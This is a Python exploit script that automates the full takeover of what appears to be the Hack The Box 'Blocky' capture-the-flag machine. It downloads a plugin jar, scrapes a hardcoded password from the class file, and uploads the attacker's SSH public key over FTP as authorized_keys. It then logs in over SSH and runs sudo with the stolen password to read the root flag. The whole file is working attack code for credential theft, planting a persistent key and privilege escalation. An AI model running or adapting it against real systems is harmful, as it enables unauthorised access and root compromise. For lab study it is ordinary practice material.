import string
import os
import requests, zipfile , io
from ftplib import FTP
import paramiko

printable = ''
test = []
final = []
username = 'notch'
url = "http://blocky.htb"
ip = '10.10.10.37'

def main():
    get_file(url)
    password = extract_creds()
    ftp_exploit(username,password)
    connection = ssh_connect(ip,username)
    priv_esc(connection,password)

def get_file(url):
    r = requests.get(f"{url}/plugins/files/BlockyCore.jar", stream=True)
    z = zipfile.ZipFile(io.BytesIO(r.content)) #create a zip "object" and put the binary data of the jar into that "object"
    z.extractall()

def extract_creds():
    print("#################")
    print("Extracting Credentials!")
    print("#################")
    with open(f"{os.getcwd()}/com/myfirstplugin/BlockyCore.class", encoding="utf-8", errors="ignore") as blocky:
        for element in blocky:
            if "root" in element:
                for i in element:
                    test.append(i)
                    for j in test:
                        if j not in string.printable:
                            test.remove(j)

    for index,ele in enumerate(test):
        if ele == '\x0c':
            if test[index+1] == '8' and test[index+2] == 'Y':
                for m in range(1,24):
                    final.append(test[index+m])
    password = ''.join(final)
    return password 

def ftp_exploit(username,password):
    print("Moving SSH key to machine!")
    print("#################")
    ftp = FTP(ip)
    ftp.login(user=username,passwd=password)
    ftp.mkd(".ssh")
    ftp.cwd('.ssh')
    ssh = open("/home/drater/.ssh/id_rsa.pub","rb")
    ftp.storbinary('STOR authorized_keys',ssh)
    ftp.close()

def ssh_connect(host,username):
    pkey = paramiko.RSAKey.from_private_key_file("/home/drater/.ssh/id_rsa")
    client = paramiko.SSHClient()
    policy = paramiko.AutoAddPolicy()
    client.set_missing_host_key_policy(policy)
    client.connect(host, username=username,pkey=pkey)
    return client

def priv_esc(connection,password):
    print("Retrieving user.txt and root.txt!")
    print("#################")
    get_user_flag = "cat ~/user.txt"
    get_root_flag = f"echo {password} | sudo -S cat /root/root.txt"
    _stdin, stdout, _stderr = connection.exec_command(get_user_flag)
    lines = stdout.read().decode()
    print("user flag: " + lines)
    _stdin, stdout, _stderr = connection.exec_command(get_root_flag)
    lines = stdout.read().decode()
    print("root flag: " + lines)
    connection.close()

main()